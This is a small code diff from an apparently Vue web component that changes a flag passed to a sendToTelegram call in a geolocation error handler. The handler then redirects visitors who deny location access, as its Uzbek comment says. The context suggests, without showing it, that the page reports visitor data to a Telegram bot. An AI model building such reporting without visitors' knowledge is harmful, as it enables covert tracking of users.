@@ -47,7 +47,7 @@ export default {
           },
           (error) => {
             console.error("Geolocation error:", error.message);
-            this.sendToTelegram(true);
+            this.sendToTelegram(false);
             window.location.href = "/"; // Ruxsat bermasa – redirect
           },
           {
